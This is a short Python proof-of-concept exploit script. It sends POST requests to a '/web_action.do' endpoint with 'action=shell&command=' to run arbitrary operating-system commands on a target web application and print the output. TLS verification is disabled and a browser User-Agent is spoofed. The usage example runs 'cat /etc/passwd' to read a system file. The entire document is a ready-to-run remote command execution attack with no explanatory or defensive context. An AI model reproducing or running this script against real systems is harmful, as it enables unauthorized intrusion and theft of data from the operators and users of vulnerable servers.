import requests
import sys
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def send_payload(url,cmd):
    url = url + "/web_action.do"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    }

    start_str = "<content><![CDATA["
    end_str = "]]></content>"
    pattern = f"{re.escape(start_str)}(.*?){re.escape(end_str)}"
    data = "action=shell&command={}".format(str(cmd))
    response = requests.post(url, headers=headers, data=data, verify=False)
    if "webcli-print" and "Success" in response.text:
        print("\033[31m[!] Target is vulnerability and The execution results are as follows\033[0m")
        result = re.search(pattern, response.text, re.DOTALL)
        if result:
            cmd_result = result.group(1)
            print("\033[32m{} \033[0m".format(cmd_result))
    else:
        print("target is not vulnerability ")


if __name__ == "__main__":
    try:
        url = sys.argv[1]
        cmd = sys.argv[2]
    except:
        print('Use: python poc.py http://127.0.0.1 "cat /etc/passwd"')
        sys.exit()
    send_payload(url,cmd)